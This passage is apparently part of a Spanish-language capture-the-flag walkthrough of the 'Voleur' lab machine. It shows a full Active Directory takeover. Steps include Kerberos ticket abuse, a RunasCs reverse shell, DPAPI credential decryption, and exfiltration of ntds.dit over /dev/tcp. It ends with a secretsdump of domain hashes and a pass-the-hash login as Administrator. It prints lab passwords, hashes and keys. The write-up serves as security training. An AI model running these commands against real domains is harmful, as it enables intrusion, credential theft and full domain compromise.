Veremos que ha funcionado, por lo que vamos a obtener un `TGT` de esta forma para autenticarnos por `WinRM` con dicho `TGT` como hemos echo en otras ocasiones.

```shell
ntpdate voleur.htb ; impacket-getTGT voleur.htb/'svc_winrm':'AFireInsidedeOzarctica980219afi'
```

Info:

```
2025-10-14 11:27:40.036901 (-0700) +44.979981 +/- 0.014028 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 44.979981
/home/kali/Desktop/voleur/bloodyAD/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
```

Ahora exportaremos la variable y añadiremos el dominio dentro del archivo `kerberos` para que no de errores con el `KDC`.

```shell
export KRB5CCNAME=svc_winrm.ccache #Exportar la variable con el de svc_winrm
sudo tee -a /etc/krb5.conf << 'EOF'
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
EOF
```

Si porbamos a conectarnos con dicho usuario de esta forma:

```shell
evil-winrm -i dc.voleur.htb -u svc_winrm -r VOLEUR.HTB
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> whoami
voleur\svc_winrm
```

Veremos que ha funcionado, por lo que leeremos la `flag` del usuario.

> user.txt

```
293b3ecbcaf43a73024ea3cfdf7f9b4e
```

## Escalate Privileges

Este usuario `svc_winrm` como tal no nos es muy util, pero recordemos que el usuario `svc_ldap` pertenece al grupo de `RESTORE_USERS` que ese si es interesante, ahora teniendo una `shell` interactiva podremos escalar al usuario `svc_ldap` mediante `RunasCs.exe` que nos tendremos que descargar.

URL = [Download RunasCs.exe ZIP GitHub](https://github.com/antonioCoco/RunasCs/releases)

Una vez descargado el `.zip` del `RunasCs` vamos a descomprimirlo.

```shell
unzip RunasCs.zip
```

Info:

```
Archive:  RunasCs.zip
  inflating: RunasCs.exe             
  inflating: RunasCs_net2.exe
```

Ahora desde la `shell` vamos a descargarnos el `RunasCs.exe` llendo al directorio `Downloads` de nuestra carpeta de usuario para que podamos utilizarlo.

```shell
cd C:/Users/svc_winrm/Downloads/
upload RunasCs.exe
```

Info:

```
Info: Uploading /home/kali/Desktop/voleur/targetedKerberoast/RunasCs.exe to C:\Users\svc_winrm\Downloads\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!
```

Ahora si desde una `shell` de `Windows` poniendo `shell` en el `meterpreter`...

Pero antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos este comando...

```powershell
.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r <IP>:<PORT>
```

Info:

```
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-733247$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2352 created in background.
```

Ahora si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.79] from (UNKNOWN) [10.10.11.76] 53924
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\svc_ldap
```

Veremos que obtenemos una `shell` como el usuario `svc_ldap` vamos a consultar los usuarios eliminados de esta forma:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
```

Info:

```
Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

Vemos que habia un usuario llamado `Todd Wolfe`, vamos a probar a recuperarlo de esta forma:

```powershell
Restore-ADObject -Identity "CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb"
net user /domain
```

Info:

```
User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            krbtgt                   svc_ldap                 
todd.wolfe               
The command completed successfully.
```

Veremos que ha funcionado y recordemos que la contraseña del `excel` que vimos anteriormente era `NightT1meP1dg3on14` vamos a probar si sigue funcionando de esta forma:

```shell
ntpdate voleur.htb ; impacket-getTGT voleur.htb/'todd.wolfe':'NightT1meP1dg3on14'
```

Info:

```
2025-10-14 12:01:59.391897 (-0700) +163.174715 +/- 0.014189 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 163.174715
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in todd.wolfe.ccache
```

Ahora exportamos la variable:

```shell
export KRB5CCNAME=/home/kali/Desktop/voleur/todd.wolfe.ccache
```

Y si vemos en `BloodHound` lo que pude hacer este usuario, veremos que tiene un grupo asociado llamado `SECOND-LINE-TECHNICIANS` y acordemonos de que la informacion la encontramos por `SMB` por lo que vamos a probar a listar los recursos `SMB` con este usuario utilizando su `TGT` a ver que vemos.

```shell
ntpdate voleur.htb ; netexec smb dc.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' -k --shares
```

Info:

```
2025-10-14 12:05:00.705305 (-0700) +18.132321 +/- 0.014420 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 18.132321
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

Vemos que sigue estando el de `IT` por lo que vamos a meternos dentro del mismo, como hicimos anteriormente:

```shell
impacket-smbclient -k -no-pass @dc.voleur.htb
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
#
```

Ahora vamos a poner los siguiente comandos para desplazarnos al recurso de `IT` e ir a la carpeta que nos interesa directamente:

```shell
use IT
cd Second-Line Support
cd Archived Users
cd todd.wolfe
ls
```

Info:

```
drw-rw-rw-          0  Wed Jan 29 07:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 07:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 07:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 07:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 07:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 06:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 07:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 07:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 07:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 07:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 07:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 07:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 04:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 04:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 04:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 07:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 07:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 07:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 07:13:10 2025 Videos
```

Veremos que es la carpeta del usuario `todd.wolfe` entera, por lo que vamos a descargarnos toda la info interesante, pero nos iremos a esta ruta:

```shell
cd AppData/Roaming/Microsoft
ls
```

Info:

```
drw-rw-rw-          0  Wed Jan 29 07:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 07:13:09 2025 ..
drw-rw-rw-          0  Wed Jan 29 07:13:09 2025 Credentials
drw-rw-rw-          0  Wed Jan 29 07:13:09 2025 Crypto
drw-rw-rw-          0  Wed Jan 29 07:13:09 2025 Internet Explorer
drw-rw-rw-          0  Wed Jan 29 07:13:09 2025 Network
drw-rw-rw-          0  Wed Jan 29 07:13:09 2025 Protect
drw-rw-rw-          0  Wed Jan 29 07:13:09 2025 Spelling
drw-rw-rw-          0  Wed Jan 29 07:13:09 2025 SystemCertificates
drw-rw-rw-          0  Wed Jan 29 07:13:09 2025 Vault
drw-rw-rw-          0  Wed Jan 29 07:13:10 2025 Windows
```

Veremos cosas interesantes por aqui entre ellas la carpeta `Credentials` y `Protect`, por lo que vamos a descargarnos los archivos de cada una de ellas.

```shell
get Credentials/772275FAD58525253490A9B0039791D3
get Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88
```

Una vez echo esto ya nos podremos salir, ya que estos archivos son los principales para poder obtener las credenciales de un usuario que todavia no sabemos.

Tendremos que establecer el `SID` de como se llamaba la carpeta de dicho archivo ya que es su `SID` correcto.

```shell
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Veremos que nos ha decodificado la clave secreta de forma correcta, ahora con esto podremos saber las credenciales de dicho usuario pudiendo decodificarlas.

```shell
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

Veremos que ha funcionado y obtendremos las credenciales del usuario `jeremy.combs`, ahora tendremos que realizar lo mismo de siempre obtener el `TGT` del usuario en cuestion y si vemos la informacion del usuario en `BloodHound` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-14 132442.png" alt=""><figcaption></figcaption></figure>

Pertenece a un grupo llamado `THIRD-LINE TECHNICIANS` que por lo que se ve tendremos que realizar los mismos pasos de antes, metiendonos en el `SMB` ahora con este usuario en la carpeta `IT` y ver que contiene dicha carpeta de dicho grupo.

Vamos a obtener el `TGT` del usuario.

```shell
ntpdate voleur.htb ; impacket-getTGT voleur.htb/'jeremy.combs':'qT3V9pLXyN7W4m'
```

Info:

```
2025-10-14 12:28:37.827367 (-0700) +141.718708 +/- 0.022589 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 141.718708
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jeremy.combs.ccache
```

Exportaremos la variable de `kerberos`.

```shell
export KRB5CCNAME=jeremy.combs.ccache
```

Ahora vamos a conectarnos directamente al servidor `SMB` con dicho `TGT` y usar la carpeta `IT` de esta forma:

```shell
impacket-smbclient -k -no-pass @dc.voleur.htb
use IT
cd Third-Line Support
ls
```

Info:

```
drw-rw-rw-          0  Thu Jan 30 08:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 01:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 08:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 08:07:35 2025 Note.txt.txt
```

Veremos `2` archivos interesantes uno es la clave privada `PEM` del usuario `jeremy.combs` y lo otro es una nota simple que pone lo siguiente:

```
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

Lo que nos dice basicamente es que han implementado una herramienta llamada `WSL` propia de `Linux` para realizar las copias de seguridad, con esta informacion se nos ocurre hacer lo siguiente.

Recordemos que habia en el escaneo un puerto `2222` que podemos deducir que es el `SSH` para conectarnos de forma remota al equipo, pero si investigamos un poco mas veremos que el `id_rsa` no es del usuario `jeremy.combs` si no, del usuario `svc_backup` y esto lo sabemos por esta comprobacion.

```shell
ssh-keygen -y -f ./id_rsa
```

Info:

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoXI8y9RFb+pvJGV6YAzNo9W99Hsk0fOcvrEMc/ij+GpYjOfd1nro/ZpuwyBnLZdcZ/ak7QzXdSJ2IFoXd0s0vtjVJ5L8MyKwTjXXMfHoBAx6mPQwYGL9zVR+LutUyr5fo0mdva/mkLOmjKhs41aisFcwpX0OdtC6ZbFhcpDKvq+BKst3ckFbpM1lrc9ZOHL3CtNE56B1hqoKPOTc+xxy3ro+GZA/JaR5VsgZkCoQL951843OZmMxuft24nAgvlzrwwy4KL273UwDkUCKCc22C+9hWGr+kuSFwqSHV6JHTVPJSZ4dUmEFAvBXNwc11WT4Y743OHJE6q7GFppWNw7wvcow9g1RmX9zii/zQgbTiEC8BAgbI28A+4RcacsSIpFw2D6a8jr+wshxTmhCQ8kztcWV6NIod+Alw/VbcwwMBgqmQC5lMnBI/0hJVWWPhH+V9bXy0qKJe7KA4a52bcBtjrkKU7A/6xjv6tc5MDacneoTQnyAYSJLwMXM84XzQ4us= svc_backup@DC
```

Vemos que es del usuario `svc_backup`, vamos a probar a realizar lo siguiente:

```shell
chmod 600 id_rsa
ssh -i id_rsa svc_backup@voleur.htb -p 2222
```

Info:

```
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 14 12:37:57 PDT 2025

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   31%       IPv4 address for eth0: 10.10.11.76
  Swap usage:     0%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                                                          [ OK ] 
svc_backup@DC:~$ whoami
svc_backup
```

Vemos que ha funcionado y seremos el usuario `svc_backup` pero dentro de un `linux`, si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for svc_backup on DC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

Vemos que podemos ser directamente `root`.

```shell
sudo su
```

Info:

```
root@DC:/home/svc_backup# whoami
root
```

Pero en este caso no importa de mucho, siendo `root` podremos probar a listar las particiones que hay montadas dentro del `linux`, por que recordemos que `linux` puede ver las particiones del sistema si esta dentro del mismo disco particionado, pero desde `windows` no.

```shell
ls -la /mnt
```

Info:

```
total 0
drwxr-xr-x 1 root       root       4096 Jan 30  2025 .
drwxr-xr-x 1 root       root       4096 Jan 30  2025 ..
drwxrwxrwx 1 svc_backup svc_backup 4096 Jul 24 13:09 c
```

Vemos que si esta montado el disco `C`, por lo que podremos realizar un volcado de los `secretos` de `Windows` pero no podemos tocar la `SAM` y todo esto de forma directa, si investigamos un poco veremos que hay una carpeta llamada `IT` y que siguiendo la estructura de carpetas nos lleva a esto:

```shell
cd IT/Third-Line Support/Backups
ls -la
```

Info:

```
total 0
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025  .
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025  ..
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025 'Active Directory'
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025  registry
```

Veremos que hay `2` carpetas y en cada una de ellas veremos los siguientes archivos:

> 'Active Directory'

```
total 24592
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30  2025 ntds.dit
-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30  2025 ntds.jfm
```

> registry

```
total 17952
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
-rwxrwxrwx 1 svc_backup svc_backup    32768 Jan 30  2025 SECURITY
-rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30  2025 SYSTEM
```

Ahora nos copiaremos los siguientes archivos en la carpeta `/tmp`:

```shell
cp registry/SYSTEM /tmp
cp Active\ Directory/ntds.dit /tmp/
```

Estos `2` archivos son los importantes para realizar un `volcado` de los secretos de `Windows`.

Ahora desde la `/tmp` vamos a pasarnos los archivos a nuestra maquina `hosts` de esta forma:

> Maquina atacante

```shell
nc -lvnp 8000 > SYSTEM
```

```shell
nc -lvnp 8001 > ntds.dit
```

> Maquina victima

```shell
cd /tmp
cat SYSTEM > /dev/tcp/<IP>/8000
```

```shell
cd /tmp
cat ntds.dit > /dev/tcp/<IP>/8001
```

Ahora si listamos nuestra maquina atacante veremos que se pasaron bien los archivos.

```shell
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up...
```

Con esto veremos que hemos obtenido los `hashes` de los usuarios del dominio, por lo que vamos a generar un `TGT` del usuario `admin` con el `hash` de esta forma:

```shell
ntpdate voleur.htb ; impacket-getTGT -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 voleur.htb/administrator
```

Info:

```
2025-10-14 14:17:10.996175 (-0700) +651.387039 +/- 0.014665 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 651.387039
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache
```

Ahora exportamos la variable de `kerberos`.

```shell
export KRB5CCNAME=administrator.ccache
```

Ahora con todo esto configurado vamos a meternos en la `shell` interactiva de `evil-winrm` con el `hash` realizando un `Pass-The-Hash` y con la autenticacion de `kerberos` que hemos generado.

```shell
evil-winrm -i dc.voleur.htb -u Administrator -H e656e07c56d831611b577b160b259ad2 -r VOLEUR.HTB
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Warning: Password is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
voleur\administrator
```

Veremos que ha funcionado, por lo que leeremos la `flag` del usuario `admin`.

> root.txt

```
ae791530007a5a99ce04ae0c5df90db5
```
